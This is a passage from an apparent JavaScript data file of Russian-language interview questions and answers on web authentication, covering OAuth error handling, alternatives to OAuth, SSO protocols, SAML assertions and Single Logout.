re-login</li><li>      redirectToLogin();</li><li>    }</li><li>  }</li><li>}</li></ul><p><strong>4. PKCE code_verifier утерян:</strong></p><p><strong>Проблема:</strong></p><ul><li>SPA перезагружается между /authorize и callback</li><li>code_verifier был в памяти</li></ul><p><strong>Решение:</strong></p><ul><li>✅ Хранить в sessionStorage</li><li>sessionStorage.setItem('pkce_verifier', codeVerifier);</li></ul><p><strong>5. Multiple provider проблемы:</strong></p><p><strong>Проблема:</strong></p><ul><li>Пользователь связал несколько провайдеров</li><li>Не понятно какой использовать</li><li>Конфликт email адресов</li></ul><p><strong>Решение:</strong></p><ul><li>✅ Primary provider в настройках</li><li>✅ Показывать все связанные аккаунты</li><li>✅ Email verification для связывания</li></ul><p><strong>User-friendly error messages:</strong></p><p><strong>Плохие сообщения:</strong></p><ul><li>❌ \"Error: invalid_grant\"</li><li>❌ \"OAuth failed\"</li><li>❌ \"500 Internal Server Error\"</li></ul><p><strong>Хорошие сообщения:</strong></p><ul><li>✅ \"Не получилось подключить Google аккаунт. Попробуйте ещё раз\"</li><li>✅ \"Для этой функции нужен доступ к календарю. Разрешите доступ в настройках\"</li><li>✅ \"Похоже, Google временно недоступен. Попробуйте через несколько минут\"</li></ul><p><strong>Error recovery стратегии:</strong></p><ul><li>✅ Автоматический retry для временных ошибок</li><li>✅ Fallback на другой провайдер</li><li>✅ Graceful degradation — отключить функцию без OAuth</li><li>✅ Clear call-to-action для пользователя</li></ul><p><strong>Логирование ошибок:</strong></p><ul><li>// Структурированные логи</li><li>logger.error('OAuth token exchange failed', {</li><li>  error: error.message,</li><li>  provider: 'google',</li><li>  userId: userId,</li><li>  errorCode: 'invalid_grant',</li><li>  timestamp: Date.now()</li><li>});</li></ul><p><strong>Best Practices:</strong></p><ul><li>✅ Всегда проверять state parameter</li><li>✅ Graceful degradation при ошибках</li><li>✅ User-friendly сообщения об ошибках</li><li>✅ Retry logic с backoff</li><li>✅ Логирование для debugging</li><li>✅ Мониторинг error rates</li><li>✅ Тестирование всех error scenarios</li></ul>",
    difficulty: 'middle',
    tags: ['OAuth', 'ошибки', 'error handling', 'debugging', 'UX']
  },

  {
    id: 85,
    question: "Какие альтернативы OAuth существуют и когда их стоит использовать?",
    answer: "<p><strong>OAuth не всегда оптимальное решение</strong> — существуют альтернативы для разных сценариев.</p><p><strong>1. SAML (Security Assertion Markup Language):</strong></p><p><strong>Что это:</strong></p><ul><li>XML-based протокол для SSO</li><li>Enterprise стандарт</li><li>Существует с начала 2000-х</li></ul><p><strong>Отличия от OAuth:</strong></p><ul><li>OAuth — авторизация, SAML — аутентификация</li><li>OAuth — JSON/REST, SAML — XML</li><li>OAuth — mobile/API friendly, SAML — enterprise/web</li></ul><p><strong>Когда использовать:</strong></p><ul><li>✅ Enterprise B2B приложения</li><li>✅ Интеграция с корпоративными IdP</li><li>✅ Требования compliance (HIPAA, SOC2)</li><li>✅ Уже есть SAML инфраструктура</li></ul><p><strong>Когда НЕ использовать:</strong></p><ul><li>❌ Mobile приложения</li><li>❌ API-first архитектура</li><li>❌ Нужна простая интеграция</li></ul><p><strong>2. Session-based Authentication:</strong></p><p><strong>Что это:</strong></p><ul><li>Традиционный подход с cookies</li><li>Server-side sessions</li><li>Stateful аутентификация</li></ul><p><strong>Как работает:</strong></p><ul><li>Пользователь логинится → session создаётся</li><li>Session ID в cookie</li><li>Сервер проверяет session при каждом запросе</li></ul><p><strong>Когда использовать:</strong></p><ul><li>✅ Простые монолитные приложения</li><li>✅ Когда нужен строгий контроль сессий</li><li>✅ Мгновенный logout критичен</li><li>✅ Нет необходимости в API доступе третьих лиц</li></ul><p><strong>Преимущества vs OAuth:</strong></p><ul><li>✅ Проще реализовать</li><li>✅ Мгновенное управление сессиями</li><li>✅ Меньше moving parts</li></ul><p><strong>Недостатки:</strong></p><ul><li>❌ Не подходит для API/микросервисов</li><li>❌ Проблемы с масштабированием</li><li>❌ CORS сложности</li></ul><p><strong>3. API Keys:</strong></p><p><strong>Что это:</strong></p><ul><li>Простой токен для доступа к API</li><li>Обычно долгоживущий</li><li>Без user context</li></ul><p><strong>Когда использовать:</strong></p><ul><li>✅ Server-to-server интеграции</li><li>✅ Публичные API без user data</li><li>✅ Простые use cases</li></ul><p><strong>Примеры:</strong></p><ul><li>Google Maps API key</li><li>Stripe API key</li><li>Weather API key</li></ul><p><strong>Недостатки:</strong></p><ul><li>❌ Нет fine-grained permissions</li><li>❌ Сложно отозвать для конкретных scope</li><li>❌ Риск утечки если в client code</li></ul><p><strong>4. Magic Links (Passwordless):</strong></p><p><strong>Что это:</strong></p><ul><li>Одноразовая ссылка для входа</li><li>Отправляется на email</li><li>Без паролей</li></ul><p><strong>Как работает:</strong></p><ul><li>Пользователь вводит email</li><li>Получает ссылку с токеном</li><li>Клик → автоматический вход</li></ul><p><strong>Когда использовать:</strong></p><ul><li>✅ Упрощённая регистрация</li><li>✅ Когда безопасность email достаточна</li><li>✅ Временный доступ</li></ul><p><strong>Преимущества:</strong></p><ul><li>✅ Нет паролей для запоминания</li><li>✅ Лучше UX для casual users</li><li>✅ Меньше support запросов \"забыл пароль\"</li></ul><p><strong>Недостатки:</strong></p><ul><li>❌ Зависимость от email доступа</li><li>❌ Медленнее чем password</li><li>❌ Email может быть скомпрометирован</li></ul><p><strong>5. WebAuthn / FIDO2:</strong></p><p><strong>Что это:</strong></p><ul><li>Стандарт для биометрии и security keys</li><li>TouchID, FaceID, YubiKey</li><li>Passwordless + phishing-resistant</li></ul><p><strong>Когда использовать:</strong></p><ul><li>✅ Максимальная безопасность</li><li>✅ Финансовые приложения</li><li>✅ Healthcare</li><li>✅ Замена паролей</li></ul><p><strong>Преимущества:</strong></p><ul><li>✅ Устойчивость к фишингу</li><li>✅ Удобство (биометрия)</li><li>✅ Современный стандарт</li></ul><p><strong>Недостатки:</strong></p><ul><li>❌ Требует поддержку браузера</li><li>❌ Нужен физический authenticator</li><li>❌ Сложнее для обычных пользователей</li></ul><p><strong>6. JWT без OAuth:</strong></p><p><strong>Что это:</strong></p><ul><li>Просто JWT для аутентификации</li><li>Без полного OAuth flow</li><li>Self-contained токены</li></ul><p><strong>Когда использовать:</strong></p><ul><li>✅ Внутренние API</li><li>✅ Микросервисы без third-party доступа</li><li>✅ Stateless auth нужен, OAuth overhead нет</li></ul><p><strong>Отличие от OAuth:</strong></p><ul><li>OAuth — полный протокол с flows</li><li>JWT — только формат токена</li><li>Можно использовать JWT без OAuth</li></ul><p><strong>7. Basic Authentication:</strong></p><p><strong>Что это:</strong></p><ul><li>Username:Password в Base64</li><li>В Authorization заголовке</li><li>Простейший метод</li></ul><p><strong>Когда использовать:</strong></p><ul><li>✅ Внутренние инструменты</li><li>✅ Development/staging environments</li><li>✅ Очень простые API</li></ul><p><strong>Никогда без HTTPS:</strong></p><ul><li>❌ Credentials в plain text (Base64 != encryption)</li><li>✅ HTTPS обязателен</li></ul><p><strong>Сравнительная таблица:</strong></p><table><tr><th>Метод</th><th>Сложность</th><th>Безопасность</th><th>Use Case</th></tr><tr><td>OAuth 2.0</td><td>Средняя</td><td>Высокая</td><td>Third-party access, API</td></tr><tr><td>SAML</td><td>Высокая</td><td>Очень высокая</td><td>Enterprise SSO</td></tr><tr><td>Sessions</td><td>Низкая</td><td>Средняя</td><td>Simple web apps</td></tr><tr><td>API Keys</td><td>Очень низкая</td><td>Низкая</td><td>Public APIs</td></tr><tr><td>Magic Links</td><td>Низкая</td><td>Средняя</td><td>Passwordless login</td></tr><tr><td>WebAuthn</td><td>Средняя</td><td>Очень высокая</td><td>Modern passwordless</td></tr></table><p><strong>Комбинированные подходы:</strong></p><p><strong>OAuth + Sessions:</strong></p><ul><li>OAuth для initial login</li><li>Session для последующих запросов</li><li>Best of both worlds</li></ul><p><strong>OAuth + WebAuthn:</strong></p><ul><li>OAuth для авторизации API</li><li>WebAuthn для step-up authentication</li><li>Максимальная безопасность</li></ul><p><strong>Выбор метода — Decision Tree:</strong></p><ul><li>🤔 Нужен third-party API доступ? → <strong>OAuth</strong></li><li>🤔 Enterprise SSO? → <strong>SAML</strong></li><li>🤔 Простое веб-приложение? → <strong>Sessions</strong></li><li>🤔 Passwordless для UX? → <strong>Magic Links</strong> или <strong>WebAuthn</strong></li><li>🤔 Public API без user data? → <strong>API Keys</strong></li><li>🤔 Максимальная безопасность? → <strong>WebAuthn</strong> + <strong>OAuth</strong></li></ul><p><strong>Best Practices выбора:</strong></p><ul><li>✅ Оцените реальные требования</li><li>✅ OAuth не всегда нужен</li><li>✅ Начните с простого, усложняйте по необходимости</li><li>✅ Комбинируйте методы для разных use cases</li><li>✅ Приоритет: безопасность, затем UX, затем сложность</li></ul>",
    difficulty: 'middle',
    tags: ['OAuth', 'альтернативы', 'SAML', 'WebAuthn', 'аутентификация', 'сравнение']
  },
  {
    id: 86,
    question: "Что такое SSO (Single Sign-On) и какая проблема решается этой технологией?",
    answer: "<p><strong>SSO (Single Sign-On)</strong> — это механизм аутентификации, позволяющий пользователю войти один раз и получить доступ к множеству приложений без повторного ввода credentials.</p><p><strong>Основная проблема без SSO:</strong></p><ul><li>Пользователь работает с 10+ приложениями</li><li>Каждое требует отдельный логин/пароль</li><li>Нужно помнить множество паролей</li><li>Повторный ввод credentials в каждом приложении</li><li>Сложность управления доступом при увольнении</li></ul><p><strong>Что даёт SSO:</strong></p><ul><li>Один раз залогинился → доступ ко всем приложениям</li><li>Один набор credentials вместо десятков</li><li>Централизованное управление доступом</li><li>Единая точка для security policies</li></ul><p><strong>Базовый принцип работы:</strong></p><ol><li>Пользователь логинится в <strong>Identity Provider (IdP)</strong></li><li>IdP выдаёт доказательство аутентификации (токен/assertion)</li><li>Пользователь обращается к приложению (Service Provider)</li><li>Приложение проверяет доказательство у IdP</li><li>Приложение предоставляет доступ без повторного логина</li></ol><p><strong>Ключевые компоненты:</strong></p><ul><li><strong>Identity Provider (IdP)</strong> — централизованный сервис аутентификации</li><li><strong>Service Provider (SP)</strong> — приложения, доверяющие IdP</li><li><strong>Trust relationship</strong> — настроенное доверие между IdP и SP</li></ul><p><strong>Примеры в жизни:</strong></p><ul><li>Google Workspace — один вход в Gmail, Drive, Calendar, Meet</li><li>Microsoft 365 — один логин для всех сервисов</li><li>Корпоративный SSO — вход в Windows → доступ ко всем внутренним системам</li></ul><p><strong>Типы SSO:</strong></p><ul><li><strong>Enterprise SSO</strong> — внутри организации (Active Directory)</li><li><strong>Web SSO</strong> — между веб-приложениями (SAML, OAuth/OIDC)</li><li><strong>Federated SSO</strong> — между организациями (партнёрские интеграции)</li></ul><p><strong>SSO vs обычная аутентификация:</strong></p><table><tr><th>Аспект</th><th>Без SSO</th><th>С SSO</th></tr><tr><td>Логинов</td><td>N раз (для N приложений)</td><td>1 раз</td></tr><tr><td>Паролей</td><td>N паролей</td><td>1 пароль</td></tr><tr><td>Управление</td><td>В каждом приложении</td><td>Централизованно</td></tr><tr><td>Безопасность</td><td>Слабые пароли, переиспользование</td><td>Сильная политика в одном месте</td></tr></table>",
    difficulty: 'junior',
    tags: ['SSO', 'Single Sign-On', 'аутентификация', 'Identity Provider']
  },

  {
    id: 87,
    question: "Как работает процесс SSO аутентификации в веб-приложениях?",
    answer: "<p><strong>Процесс SSO аутентификации</strong> включает взаимодействие между пользователем, Identity Provider и приложениями.</p><p><strong>Базовый SSO Flow:</strong></p><ol><li>👤 Пользователь открывает Приложение A (не залогинен)</li><li>🔄 Приложение A → redirect на Identity Provider</li><li>🔐 IdP проверяет: есть ли активная сессия?</li><li>❌ Если нет → показывает форму логина</li><li>✅ Пользователь вводит credentials</li><li>🎫 IdP создаёт сессию и выдаёт токен/assertion</li><li>🔄 IdP → redirect обратно на Приложение A с токеном</li><li>✅ Приложение A проверяет токен и создаёт локальную сессию</li><li>🚀 Пользователь работает в Приложении A</li></ol><p><strong>Второе приложение (магия SSO):</strong></p><ol><li>👤 Пользователь открывает Приложение B</li><li>🔄 Приложение B → redirect на IdP</li><li>✅ IdP видит активную сессию (из шага 6)</li><li>🎫 Сразу выдаёт токен БЕЗ повторного логина</li><li>🔄 Redirect на Приложение B с токеном</li><li>✅ Пользователь автоматически залогинен</li></ol><p><strong>Детали процесса:</strong></p><p><strong>1. Discovery (обнаружение IdP):</strong></p><ul><li>Приложение знает URL своего IdP</li><li>Обычно настроено при регистрации приложения</li><li>Или определяется по email домену пользователя</li></ul><p><strong>2. Authentication Request:</strong></p><ul><li>Приложение формирует запрос к IdP</li><li>Включает: свой ID, callback URL, требуемые атрибуты</li><li>Redirect пользователя с этими параметрами</li></ul><p><strong>3. IdP Session Check:</strong></p><ul><li>IdP проверяет наличие активной сессии (cookie)</li><li>Если есть — пропускает форму логина</li><li>Если нет — показывает форму</li></ul><p><strong>4. Assertion/Token Generation:</strong></p><ul><li>IdP создаёт подписанное утверждение о пользователе</li><li>Содержит: user ID, атрибуты (email, имя), время создания</li><li>Подпись гарантирует подлинность</li></ul><p><strong>5. Response и Validation:</strong></p><ul><li>IdP возвращает assertion приложению</li><li>Приложение проверяет подпись</li><li>Извлекает данные пользователя</li><li>Создаёт локальную сессию</li></ul><p><strong>Типы передачи данных:</strong></p><p><strong>Browser-based (через браузер):</strong></p><ul><li>Все redirects через браузер пользователя</li><li>IdP и приложения не общаются напрямую</li><li>Assertion в URL или POST запросе</li></ul><p><strong>Backend channel (опционально):</strong></p><ul><li>После получения кода/токена</li><li>Приложение может запросить данные напрямую у IdP</li><li>Для дополнительной информации</li></ul><p><strong>Важные моменты безопасности:</strong></p><ul><li>✅ HTTPS обязателен везде</li><li>✅ Подпись assertion для предотвращения подделки</li><li>✅ Короткое время жизни assertion (минуты)</li><li>✅ Проверка audience (для кого предназначен)</li><li>✅ CSRF защита через state parameter</li></ul><p><strong>Session Management:</strong></p><ul><li><strong>IdP Session</strong> — централизованная сессия у провайдера</li><li><strong>SP Sessions</strong> — локальные сессии в каждом приложении</li><li>При logout из IdP → все SP сессии должны завершиться (SLO)</li></ul>",
    difficulty: 'middle',
    tags: ['SSO', 'процесс аутентификации', 'flow', 'Identity Provider', 'Service Provider']
  },

  {
    id: 88,
    question: "Какие преимущества даёт SSO для пользователей и бизнеса?",
    answer: "<p><strong>SSO предоставляет значительные преимущества</strong> как для конечных пользователей, так и для организаций.</p><p><strong>Преимущества для пользователей:</strong></p><p><strong>1. Упрощение доступа:</strong></p><ul><li>✅ Один логин вместо множества</li><li>✅ Не нужно помнить десятки паролей</li><li>✅ Быстрый доступ к приложениям</li><li>✅ Меньше friction при работе</li></ul><p><strong>Статистика:</strong></p><ul><li>Средний сотрудник работает с 10+ приложениями</li><li>Без SSO тратит 5-10 минут в день на логины</li><li>~40 часов в год на ввод паролей</li></ul><p><strong>2. Лучший UX:</strong></p><ul><li>Seamless переход между приложениями</li><li>Нет повторяющихся форм логина</li><li>Меньше \"забыл пароль\" сценариев</li><li>Быстрый onboarding в новые приложения</li></ul><p><strong>3. Повышение продуктивности:</strong></p><ul><li>Меньше времени на аутентификацию</li><li>Меньше прерываний workflow</li><li>Быстрый доступ к нужным ресурсам</li></ul><p><strong>Преимущества для бизнеса:</strong></p><p><strong>1. Безопасность:</strong></p><ul><li>✅ Централизованная политика паролей</li><li>✅ Обязательная MFA в одном месте</li><li>✅ Единая точка для мониторинга входов</li><li>✅ Меньше слабых паролей (не нужно придумывать много)</li><li>✅ Снижение риска credential reuse</li></ul><p><strong>Факты:</strong></p><ul><li>81% взломов из-за слабых/украденных паролей</li><li>SSO + MFA снижает риск на 99%</li></ul><p><strong>2. Управление доступом:</strong></p><ul><li>✅ Централизованное управление пользователями</li><li>✅ Мгновенное отключение доступа при увольнении</li><li>✅ Проще управлять ролями и правами</li><li>✅ Аудит доступа в одном месте</li></ul><p><strong>Пример:</strong></p><ul><li>Сотрудник уволился → отключили в IdP</li><li>Автоматически потерял доступ ко ВСЕМ приложениям</li><li>Без SSO: нужно отключать в каждом сервисе отдельно</li></ul><p><strong>3. Снижение IT затрат:</strong></p><ul><li>✅ Меньше password reset запросов</li><li>✅ Автоматизация provisioning/deprovisioning</li><li>✅ Меньше времени на user management</li><li>✅ Централизованная интеграция новых приложений</li></ul><p><strong>ROI метрики:</strong></p><ul><li>50-70% снижение helpdesk запросов по паролям</li><li>~$70 стоимость одного password reset</li><li>Окупаемость SSO за 6-12 месяцев</li></ul><p><strong>4. Compliance и аудит:</strong></p><ul><li>✅ Единый audit trail для всех систем</li><li>✅ Проще соответствовать регуляциям (GDPR, SOX, HIPAA)</li><li>✅ Централизованные логи доступа</li><li>✅ Proof of access control для аудиторов</li></ul><p><strong>5. Ускорение adoption новых сервисов:</strong></p><ul><li>Новое приложение интегрируется с SSO</li><li>Пользователи получают доступ сразу</li><li>Не нужно создавать отдельные аккаунты</li><li>Faster time-to-value</li></ul><p><strong>Преимущества для разработчиков:</strong></p><ul><li>✅ Не нужно строить собственную auth систему</li><li>✅ Делегирование аутентификации IdP</li><li>✅ Меньше кода для поддержки</li><li>✅ Стандартные протоколы (SAML, OIDC)</li></ul><p><strong>Измеримые показатели:</strong></p><table><tr><th>Метрика</th><th>Без SSO</th><th>С SSO</th></tr><tr><td>Время на логин</td><td>30-60 сек</td><td>0-5 сек</td></tr><tr><td>Password reset тикетов</td><td>100%</td><td>30-40%</td></tr><tr><td>Время offboarding</td><td>1-2 часа</td><td>5 минут</td></tr><tr><td>Security incidents</td><td>Baseline</td><td>-50-70%</td></tr></table><p><strong>Потенциальные вызовы:</strong></p><ul><li>⚠️ IdP становится single point of failure</li><li>⚠️ Начальные затраты на внедрение</li><li>⚠️ Интеграция legacy систем может быть сложной</li><li>⚠️ Vendor lock-in риск</li></ul><p><strong>Но преимущества перевешивают:</strong></p><ul><li>High availability IdP решения доступны</li><li>ROI положительный через 6-12 месяцев</li><li>Большинство современных приложений поддерживают SSO</li></ul>",
    difficulty: 'junior',
    tags: ['SSO', 'преимущества', 'безопасность', 'UX', 'ROI']
  },

  {
    id: 89,
    question: "Какие протоколы используются для реализации SSO?",
    answer: "<p><strong>SSO реализуется через несколько стандартных протоколов</strong>, каждый со своими особенностями.</p><p><strong>1. SAML 2.0 (Security Assertion Markup Language):</strong></p><p><strong>Что это:</strong></p><ul><li>XML-based протокол</li><li>Самый распространённый в enterprise</li><li>Существует с 2005 года</li></ul><p><strong>Основные компоненты:</strong></p><ul><li><strong>Assertion</strong> — XML документ с информацией о пользователе</li><li><strong>Service Provider (SP)</strong> — приложение</li><li><strong>Identity Provider (IdP)</strong> — сервис аутентификации</li></ul><p><strong>Как работает:</strong></p><ol><li>SP redirect на IdP</li><li>IdP аутентифицирует пользователя</li><li>IdP создаёт SAML assertion (XML)</li><li>POST assertion обратно на SP</li><li>SP валидирует подпись и создаёт сессию</li></ul><p><strong>Когда использовать:</strong></p><ul><li>✅ Enterprise B2B приложения</li><li>✅ Интеграция с корпоративными IdP (Okta, Azure AD)</li><li>✅ Compliance требования</li><li>✅ Веб-приложения (не mobile)</li></ul><p><strong>Преимущества:</strong></p><ul><li>✅ Зрелый стандарт</li><li>✅ Широкая поддержка в enterprise</li><li>✅ Детальный контроль атрибутов</li></ul><p><strong>Недостатки:</strong></p><ul><li>❌ Сложность (XML)</li><li>❌ Не подходит для mobile</li><li>❌ Тяжёлый для API</li></ul><p><strong>2. OpenID Connect (OIDC):</strong></p><p><strong>Что это:</strong></p><ul><li>Надстройка над OAuth 2.0</li><li>JSON-based, REST friendly</li><li>Современный стандарт</li></ul><p><strong>Основные компоненты:</strong></p><ul><li><strong>ID Token</strong> — JWT с информацией о пользователе</li><li><strong>UserInfo endpoint</strong> — получение профиля</li><li><strong>Authorization Server</strong> — IdP</li></ul><p><strong>Как работает:</strong></p><ol><li>Redirect на Authorization Server</li><li>Пользователь логинится</li><li>Получаем ID Token (JWT) + Access Token</li><li>ID Token содержит user claims</li><li>Создаём сессию на основе ID Token</li></ol><p><strong>Когда использовать:</strong></p><ul><li>✅ Современные веб-приложения</li><li>✅ Mobile приложения</li><li>✅ API-first архитектура</li><li>✅ Микросервисы</li></ul><p><strong>Преимущества:</strong></p><ul><li>✅ Простота (JSON, REST)</li><li>✅ Mobile friendly</li><li>✅ Лёгкий для разработчиков</li><li>✅ OAuth 2.0 экосистема</li></ul><p><strong>Недостатки:</strong></p><ul><li>❌ Меньше adoption в старых enterprise</li><li>❌ Некоторые IdP только SAML</li></ul><p><strong>3. Kerberos:</strong></p><p><strong>Что это:</strong></p><ul><li>Сетевой протокол аутентификации</li><li>Используется в Windows Active Directory</li><li>Ticket-based система</li></ul><p><strong>Как работает:</strong></p><ul><li>Пользователь получает Ticket Granting Ticket (TGT)</li><li>Использует TGT для получения Service Tickets</li><li>Service Tickets для доступа к приложениям</li></ul><p><strong>Когда использовать:</strong></p><ul><li>✅ Windows корпоративные сети</li><li>✅ On-premise инфраструктура</li><li>✅ Интеграция с Active Directory</li></ul><p><strong>Преимущества:</strong></p><ul><li>✅ Встроен в Windows</li><li>✅ Прозрачная аутентификация</li><li>✅ Высокая производительность</li></ul><p><strong>Недостатки:</strong></p><ul><li>❌ Сложная настройка</li><li>❌ Привязан к сети организации</li><li>❌ Не подходит для cloud/web</li></ul><p><strong>4. CAS (Central Authentication Service):</strong></p><p><strong>Что это:</strong></p><ul><li>Open-source SSO протокол</li><li>Популярен в образовательных учреждениях</li><li>Ticket-based</li></ul><p><strong>Когда использовать:</strong></p><ul><li>✅ Университеты и школы</li><li>✅ Legacy системы</li><li>✅ Когда нужен простой SSO</li></ul><p><strong>Сравнение протоколов:</strong></p><table><tr><th>Аспект</th><th>SAML</th><th>OIDC</th><th>Kerberos</th></tr><tr><td>Формат</td><td>XML</td><td>JSON</td><td>Binary</td></tr><tr><td>Сложность</td><td>Высокая</td><td>Средняя</td><td>Очень высокая</td></tr><tr><td>Mobile</td><td>❌</td><td>✅</td><td>❌</td></tr><tr><td>API</td><td>❌</td><td>✅</td><td>❌</td></tr><tr><td>Enterprise</td><td>✅✅✅</td><td>✅✅</td><td>✅✅✅</td></tr><tr><td>Web</td><td>✅</td><td>✅✅✅</td><td>⚠️</td></tr></table><p><strong>Выбор протокола:</strong></p><ul><li>🏢 Enterprise B2B → <strong>SAML</strong></li><li>📱 Modern apps, mobile → <strong>OIDC</strong></li><li>🖥️ Windows корпоративная сеть → <strong>Kerberos</strong></li><li>🎓 Образование → <strong>CAS</strong> или <strong>SAML</strong></li></ul><p><strong>Тренды:</strong></p><ul><li>OIDC набирает популярность</li><li>SAML всё ещё доминирует в enterprise</li><li>Многие IdP поддерживают оба (SAML + OIDC)</li></ul>",
    difficulty: 'middle',
    tags: ['SSO', 'SAML', 'OIDC', 'Kerberos', 'протоколы']
  },

  {
    id: 90,
    question: "Как работает SAML-based SSO и что такое SAML assertion?",
    answer: "<p><strong>SAML SSO</strong> — это XML-based протокол для обмена данными аутентификации между Identity Provider и Service Provider.</p><p><strong>Детальный SAML Flow:</strong></p><p><strong>1. SP-Initiated Flow (самый распространённый):</strong></p><ol><li>👤 Пользователь открывает приложение (SP)</li><li>❌ SP видит что пользователь не залогинен</li><li>📝 SP генерирует SAML AuthnRequest (XML)</li><li>🔄 Browser redirect на IdP с AuthnRequest</li><li>🔐 IdP проверяет сессию или показывает форму логина</li><li>✅ Пользователь вводит credentials (если нужно)</li><li>📝 IdP создаёт SAML Response с Assertion</li><li>🔄 Browser POST SAML Response обратно на SP</li><li>✅ SP валидирует Response и создаёт сессию</li></ol><p><strong>2. IdP-Initiated Flow:</strong></p><ol><li>Пользователь сначала логинится в IdP</li><li>В IdP портале выбирает приложение</li><li>IdP создаёт SAML Assertion</li><li>Browser POST на SP</li><li>SP создаёт сессию</li></ol><p><strong>SAML Assertion — что это:</strong></p><p><strong>Структура XML документа:</strong></p><ul><li>Подписанное утверждение о пользователе</li><li>Содержит identity claims и metadata</li><li>Цифровая подпись для проверки подлинности</li></ul><p><strong>Основные части Assertion:</strong></p><p><strong>1. Subject:</strong></p><ul><li>О ком это assertion</li><li>NameID — уникальный идентификатор пользователя</li><li>Формат: email, persistent ID, transient</li></ul><p><strong>2. Conditions:</strong></p><ul><li>Время валидности (NotBefore, NotOnOrAfter)</li><li>Audience — для какого SP предназначен</li><li>Обычно валиден 5 минут</li></ul><p><strong>3. AuthnStatement:</strong></p><ul><li>Как пользователь аутентифицировался</li><li>Время аутентификации</li><li>Session index</li></ul><p><strong>4. AttributeStatement:</strong></p><ul><li>Атрибуты пользователя</li><li>Email, имя, роли, департамент</li><li>Настраивается в IdP</li></ul><p><strong>5. Signature:</strong></p><ul><li>Цифровая подпись всего документа</li><li>Использует X.509 сертификат IdP</li><li>SP проверяет с помощью публичного ключа</li></ul><p><strong>Пример упрощённого SAML Assertion:</strong></p><ul><li>&lt;saml:Assertion&gt;</li><li>  &lt;saml:Subject&gt;</li><li>    &lt;saml:NameID&gt;user@example.com&lt;/saml:NameID&gt;</li><li>  &lt;/saml:Subject&gt;</li><li>  &lt;saml:Conditions NotBefore=\"...\" NotOnOrAfter=\"...\"&gt;</li><li>    &lt;saml:AudienceRestriction&gt;SP-entity-id&lt;/...&gt;</li><li>  &lt;/saml:Conditions&gt;</li><li>  &lt;saml:AttributeStatement&gt;</li><li>    &lt;saml:Attribute Name=\"email\"&gt;user@example.com&lt;/...&gt;</li><li>    &lt;saml:Attribute Name=\"role\"&gt;admin&lt;/...&gt;</li><li>  &lt;/saml:AttributeStatement&gt;</li><li>  &lt;Signature&gt;...&lt;/Signature&gt;</li><li>&lt;/saml:Assertion&gt;</li></ul><p><strong>Ключевые моменты безопасности:</strong></p><p><strong>1. Подпись Assertion:</strong></p><ul><li>Mandatory для предотвращения подделки</li><li>SP должен проверить подпись</li><li>Использует X.509 сертификаты</li></ul><p><strong>2. Encryption (опционально):</strong></p><ul><li>Assertion может быть зашифрован</li><li>Защита чувствительных атрибутов</li><li>SP расшифровывает своим приватным ключом</li></ul><p><strong>3. Время жизни:</strong></p><ul><li>Короткое окно валидности (обычно 5 минут)</li><li>Защита от replay атак</li><li>SP проверяет NotBefore и NotOnOrAfter</li></ul><p><strong>4. Audience restriction:</strong></p><ul><li>Assertion предназначен для конкретного SP</li><li>Защита от использования в другом приложении</li></ul><p><strong>Bindings (способы передачи):</strong></p><p><strong>HTTP-POST Binding (основной):</strong></p><ul><li>SAML Response в HTML форме</li><li>Auto-submit через JavaScript</li><li>Безопасно, работает везде</li></ul><p><strong>HTTP-Redirect Binding:</strong></p><ul><li>SAML в URL параметрах</li><li>Только для AuthnRequest (не Response)</li><li>Ограничение по размеру URL</li></ul><p><strong>Metadata обмен:</strong></p><p><strong>IdP Metadata:</strong></p><ul><li>XML файл с конфигурацией IdP</li><li>SSO endpoint URL</li><li>Публичный сертификат</li><li>Поддерживаемые bindings</li></ul><p><strong>SP Metadata:</strong></p><ul><li>Entity ID приложения</li><li>Assertion Consumer Service URL</li><li>Требуемые атрибуты</li></ul><p><strong>Trust establishment:</strong></p><ul><li>SP и IdP обмениваются metadata</li><li>Настраивается trust relationship</li><li>Обмен сертификатами для проверки подписей</li></ul><p><strong>Типичные проблемы:</strong></p><ul><li>⚠️ Clock skew — разница времени между серверами</li><li>⚠️ Certificate expiration — истёкшие сертификаты</li><li>⚠️ Audience mismatch — неправильный SP entity ID</li><li>⚠️ Missing attributes — не все атрибуты в assertion</li></ul>",
    difficulty: 'middle',
    tags: ['SSO', 'SAML', 'assertion', 'XML', 'безопасность']
  },

  {
    id: 91,
    question: "Что такое Single Logout (SLO) и как он работает в SSO системах?",
    answer: "<p><strong>Single Logout (SLO)</strong> — это механизм завершения всех сессий пользователя во всех приложениях одним действием.</p><p><strong>Проблема без SLO:</strong></p><ul><li>Пользователь залогинен в 10 приложениях через SSO</li><li>Logout из одного приложения</li><li>❌ Остальные 9 приложений остаются доступными</li><li>❌ Риск безопасности на общих компьютерах</li></ul><p><strong>С SLO:</strong></p><ul><li>Logout из любого приложения или IdP</li><li>✅ Автоматически завершаются ВСЕ сессии</li><li>✅ Пользователь полностью разлогинен</li></ul><p><strong>Типы SLO:</strong></p><p><strong>1. IdP-Initiated SLO:</strong></p><p><strong>Сценарий:</strong></p><ul><li>Пользователь нажимает \"Logout\" в IdP портале</li><li>IdP знает все активные SP сессии</li><li>Уведомляет каждый SP о logout</li></ul><p><strong>Процесс:</strong></p><ol><li>👤 Пользователь → IdP: \"Logout\"</li><li>📋 IdP смотрит список активных SP сессий</li><li>🔄 IdP → SP1: LogoutRequest</li><li>✅ SP1 завершает локальную сессию</li><li>← SP1 → IdP: LogoutResponse</li><li>🔄 IdP → SP2, SP3... (параллельно или последовательно)</li><li>✅ IdP завершает свою сессию</li><li>✅ Пользователь разлогинен везде</li></ol><p><strong>2. SP-Initiated SLO:</strong></p><p><strong>Сценарий:</strong></p><ul><li>Пользователь нажимает \"Logout\" в приложении</li><li>SP инициирует SLO через IdP</li></ul><p><strong>Процесс:</strong></p><ol><li>👤 Пользователь → SP1: \"Logout\"</li><li>🔄 SP1 → IdP: LogoutRequest</li><li>📋 IdP смотрит активные сессии</li><li>🔄 IdP → SP2, SP3...: LogoutRequest</li><li>✅ Все SP завершают сессии</li><li>← Responses обратно к IdP</li><li>← IdP → SP1: LogoutResponse (final)</li><li>✅ SP1 показывает \"Successfully logged out\"</li></ol><p><strong>SAML SLO детали:</strong></p><p><strong>LogoutRequest содержит:</strong></p><ul><li>NameID — идентификатор пользователя</li><li>SessionIndex — ID сессии для завершения</li><li>Reason — опционально, причина logout</li></ul><p><strong>LogoutResponse:</strong></p><ul><li>StatusCode — успешно или нет</li><li>InResponseTo — ссылка на Request</li></ul><p><strong>OIDC SLO:</strong></p><p><strong>Два подхода:</strong></p><p><strong>1. Front-Channel Logout:</strong></p><ul><li>IdP возвращает HTML с 